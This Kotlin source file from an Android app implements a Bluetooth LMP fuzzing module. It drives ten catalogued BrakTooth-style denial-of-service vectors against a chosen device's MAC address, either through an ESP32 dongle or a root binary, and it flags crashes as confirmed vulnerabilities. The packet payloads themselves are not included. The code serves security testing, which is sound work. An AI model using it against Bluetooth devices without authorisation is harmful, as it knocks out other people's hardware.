package com.hereliesaz.blusnu.data

import android.util.Log
import com.hereliesaz.blusnu.utils.MacValidator
import kotlinx.coroutines.channels.Channel
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.flow.flow
import kotlinx.coroutines.withTimeoutOrNull
import java.io.File
import kotlin.coroutines.cancellation.CancellationException

/**
 * Enumeration of LMP fuzzing vectors targeting firmware-level vulnerabilities.
 *
 * Each vector corresponds to a malformed Link Manager Protocol (LMP) packet type
 * from the BlueToolkit vulnerability catalog. These exploit parsing, state machine,
 * and buffer handling flaws in Bluetooth baseband firmware.
 *
 * @property description A human-readable description of the attack mechanism.
 */
enum class LmpFuzzVector(val description: String) {
    FEATURE_RESPONSE_FLOOD("V4: Floods target with LMP_features_res packets"),
    AUTO_RATE_OVERFLOW("V5: Sends LMP_auto_rate with overflow values"),
    AU_RAND_FLOODING("V12: Floods LMP_au_rand authentication challenges"),
    MAX_SLOT_OVERFLOW("V1: LMP_max_slot with invalid slot count"),
    TIMING_ACCURACY_REQ("V8: Malformed LMP_timing_accuracy_req"),
    SETUP_COMPLETE_RACE("V3: LMP_setup_complete before pairing finishes"),
    DETACH_FLOOD("V7: Rapid LMP_detach flood"),
    SCO_LINK_REQ_INVALID("V9: LMP_SCO_link_req with invalid params"),
    ENCAPSULATED_HEADER("V14: Oversized LMP_encapsulated_header"),
    POWER_CONTROL_OVERFLOW("V11: LMP_incr_power_req with extreme delta")
}

/**
 * Implementation of the LMP/Baseband fuzzing module.
 *
 * Sends malformed LMP packets via external hardware (ESP32 with custom firmware)
 * or a root-accessible binary to test firmware-level vulnerability to
 * BrakTooth-class denial-of-service attacks. LMP operates below the HCI layer,
 * so standard Android Bluetooth APIs cannot generate these frames; an external
 * injection path is required.
 *
 * Primary path: ESP32 dongle connected via USB serial through [HardwareManager].
 * Fallback path: Root binary at [ROOT_BINARY_PATH] invoked via `su`.
 *
 * Serial commands are serialized through an internal [Channel] to guarantee ordering.
 *
 * @property hardwareManager Interface to the USB serial hardware.
 */
class LmpFuzzingModule(private val hardwareManager: HardwareManager) {

    companion object {
        private const val TAG = "LmpFuzzingModule"
        private const val FUZZING_PHASE_TIMEOUT_MS = 30_000L
        private const val ROOT_BINARY_PATH = "/data/local/tmp/lmp_fuzzer"
    }

    /**
     * Channel used to serialize outbound serial commands so they are sent one
     * at a time in strict order, rather than fire-and-forget.
     */
    private val commandChannel = Channel<String>(capacity = Channel.UNLIMITED)

    /**
     * Handle to the currently running root-fallback process, if any.
     * Used by [stopFuzzing] to terminate an in-progress root binary session.
     */
    @Volatile
    private var activeProcess: Process? = null

    /**
     * Flag indicating whether a fuzzing session is currently active.
     * Checked by the Flow producers to bail out early on cancellation.
     */
    @Volatile
    private var cancelled = false

    /**
     * Checks whether the ESP32 hardware dongle is connected and ready
     * for LMP packet injection.
     *
     * @return true if an ESP32 device is connected and available.
     */
    fun isHardwareConnected(): Boolean {
        val state = hardwareManager.hardwareState.value
        val isConnected = state == HardwareState.CONNECTED_BTLEJACK || state == HardwareState.CONNECTED_DUAL

        if (!isConnected) return false

        val deviceType = hardwareManager.deviceType
        if (deviceType != HardwareDeviceType.ESP32 && deviceType != HardwareDeviceType.UNKNOWN) {
            Log.w(TAG, "Connected hardware is $deviceType, not ESP32. LMP fuzzing requires ESP32 firmware.")
            return false
        }

        return true
    }

    /**
     * Starts a fuzzing session against the target device using a single vector.
     *
     * If ESP32 hardware is connected, sends serial commands in the format
     * `lmp_fuzz TARGET_MAC VECTOR_ID` and collects responses from
     * [HardwareManager.deviceLogs]. If hardware is unavailable, falls back
     * to the root binary at [ROOT_BINARY_PATH].
     *
     * @param targetDevice The target Bluetooth device.
     * @param vector The specific LMP vulnerability vector to exploit.
     * @return A Flow of log messages for the UI.
     */
    fun startFuzzing(targetDevice: TargetDevice, vector: LmpFuzzVector): Flow<String> = flow {
        cancelled = false
        try {
            val mac = MacValidator.requireValid(targetDevice.macAddress)

            emit("Initializing LMP/Baseband Fuzzer...")
            emit("Target: ${targetDevice.name ?: mac}")
            emit("Vector: ${vector.name} -- ${vector.description}")

            if (isHardwareConnected()) {
                emitAll(fuzzViaHardware(mac, vector))
            } else if (File(ROOT_BINARY_PATH).exists()) {
                emit("ESP32 hardware not detected. Falling back to root binary.")
                emitAll(fuzzViaRootBinary(mac, vector))
            } else {
                emit("ERROR: No injection path available.")
                emit("Connect an ESP32 dongle flashed with LMP fuzzing firmware,")
                emit("or install lmp_fuzzer binary at $ROOT_BINARY_PATH (requires root).")
                return@flow
            }

            emit("Fuzzing vector ${vector.name} complete.")
        } catch (e: CancellationException) {
            throw e
        } catch (e: Exception) {
            Log.e(TAG, "LMP fuzzing failed", e)
            emit("ERROR: ${e.message ?: "Unknown error during fuzzing"}")
            emit("Fuzzing session aborted due to error.")
        }
    }

    /**
     * Runs every [LmpFuzzVector] sequentially against the target device.
     *
     * Each vector runs to completion (or timeout) before the next begins.
     * The session can be stopped at any time via [stopFuzzing].
     *
     * @param targetDevice The target Bluetooth device.
     * @return A Flow of log messages for the UI.
     */
    fun startFullSuite(targetDevice: TargetDevice): Flow<String> = flow {
        cancelled = false
        try {
            val mac = MacValidator.requireValid(targetDevice.macAddress)

            emit("=== LMP/Baseband Full Suite ===")
            emit("Target: ${targetDevice.name ?: mac}")
            emit("Running all ${LmpFuzzVector.values().size} vectors sequentially...")
            emit("")

            for ((index, vector) in LmpFuzzVector.values().withIndex()) {
                if (cancelled) {
                    emit("Suite cancelled by user.")
                    return@flow
                }

                emit("--- [${index + 1}/${LmpFuzzVector.values().size}] ${vector.name} ---")
                emit(vector.description)

                if (isHardwareConnected()) {
                    emitAll(fuzzViaHardware(mac, vector))
                } else if (File(ROOT_BINARY_PATH).exists()) {
                    emitAll(fuzzViaRootBinary(mac, vector))
                } else {
                    emit("ERROR: No injection path available.")
                    return@flow
                }

                emit("")
            }

            emit("=== Full suite complete ===")
        } catch (e: CancellationException) {
            throw e
        } catch (e: Exception) {
            Log.e(TAG, "LMP full suite failed", e)
            emit("ERROR: ${e.message ?: "Unknown error during full suite"}")
            emit("Full suite aborted due to error.")
        }
    }

    /**
     * Stops any in-progress fuzzing session.
     *
     * Sends a stop command to the ESP32 (if connected) and destroys any
     * active root-fallback process.
     */
    fun stopFuzzing() {
        cancelled = true

        // Stop hardware-side fuzzing if ESP32 is connected
        if (isHardwareConnected()) {
            hardwareManager.sendCommand("lmp_fuzz_stop")
        }

        // Terminate root binary process if running
        activeProcess?.let { process ->
            try {
                process.destroy()
            } catch (e: Exception) {
                Log.w(TAG, "Failed to destroy lmp_fuzzer process", e)
            }
            activeProcess = null
        }
    }

    /**
     * Executes a single fuzz vector via the ESP32 hardware dongle.
     *
     * Sends the command `lmp_fuzz TARGET_MAC VECTOR_ID` over serial and
     * monitors [HardwareManager.deviceLogs] for progress, crash detection,
     * and completion signals.
     */
    private fun fuzzViaHardware(mac: String, vector: LmpFuzzVector): Flow<String> = flow {
        val command = "lmp_fuzz $mac ${vector.name}"
        sendSerialCommand(command)
        emit("Sent: $command")

        var crashDetected = false
        var sessionComplete = false

        val result = withTimeoutOrNull(FUZZING_PHASE_TIMEOUT_MS) {
            hardwareManager.deviceLogs.first { logLine ->
                if (cancelled) {
                    sessionComplete = true
                    return@first true
                }

                emit(logLine)

                when {
                    logLine.contains("CRASH", ignoreCase = true) -> {
                        crashDetected = true
                        sessionComplete = true
                    }
                    logLine.contains("complete", ignoreCase = true) ||
                    logLine.contains("finished", ignoreCase = true) ||
                    logLine.contains("done", ignoreCase = true) -> {
                        sessionComplete = true
                    }
                    logLine.contains("timeout", ignoreCase = true) -> {
                        sessionComplete = true
                    }
                    logLine.contains("injecting", ignoreCase = true) -> {
                        // Progress indicator -- keep listening
                    }
                }

                sessionComplete
            }
        }

        if (cancelled) {
            emit("Fuzzing cancelled.")
            return@flow
        }

        if (result == null && !sessionComplete) {
            emit("Fuzzing timed out after ${FUZZING_PHASE_TIMEOUT_MS / 1000}s.")
        }

        if (crashDetected) {
            emit("CRASH DETECTED: Target stopped responding.")
            emit("Vulnerability Confirmed: ${vector.name}")
        } else if (!crashDetected && sessionComplete) {
            emit("Target resilient. No crash detected for ${vector.name}.")
        }
    }

    /**
     * Executes a single fuzz vector via the root binary fallback.
     *
     * Invokes `su -c /data/local/tmp/lmp_fuzzer TARGET_MAC VECTOR_ID` and
     * streams stdout/stderr as log lines. The [Process] handle is stored in
     * [activeProcess] so [stopFuzzing] can terminate it.
     */
    private fun fuzzViaRootBinary(mac: String, vector: LmpFuzzVector): Flow<String> = flow {
        val command = "$ROOT_BINARY_PATH $mac ${vector.name}"
        emit("Executing: su -c $command")

        val process = try {
            Runtime.getRuntime().exec(arrayOf("su", "-c", command))
        } catch (e: Exception) {
            emit("ERROR: Failed to execute root binary: ${e.message}")
            emit("Ensure device is rooted and lmp_fuzzer is at $ROOT_BINARY_PATH.")
            return@flow
        }

        activeProcess = process
        var crashDetected = false

        try {
            process.inputStream.bufferedReader().use { reader ->
                var line = reader.readLine()
                while (line != null) {
                    if (cancelled) {
                        emit("Fuzzing cancelled.")
                        return@flow
                    }

                    emit(line)

                    if (line.contains("CRASH", ignoreCase = true)) {
                        crashDetected = true
                    }

                    line = reader.readLine()
                }
            }

            // Also capture stderr
            process.errorStream.bufferedReader().use { reader ->
                var line = reader.readLine()
                while (line != null) {
                    emit("STDERR: $line")
                    line = reader.readLine()
                }
            }

            val exitCode = process.waitFor()
            emit("Process exited with code $exitCode")

            if (crashDetected) {
                emit("CRASH DETECTED: Target stopped responding.")
                emit("Vulnerability Confirmed: ${vector.name}")
            } else {
                emit("Target resilient. No crash detected for ${vector.name}.")
            }
        } finally {
            activeProcess = null
        }
    }

    /**
     * Sends a command to the ESP32 hardware via [HardwareManager.sendCommand].
     */
    private fun sendSerialCommand(command: String) {
        hardwareManager.sendCommand(command)
    }

    /**
     * Helper to collect all values from an inner Flow and emit them into the
     * outer flow. Equivalent to kotlinx.coroutines FlowCollector.emitAll.
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.emitAll(innerFlow: Flow<String>) {
        innerFlow.collect { value -> emit(value) }
    }
}
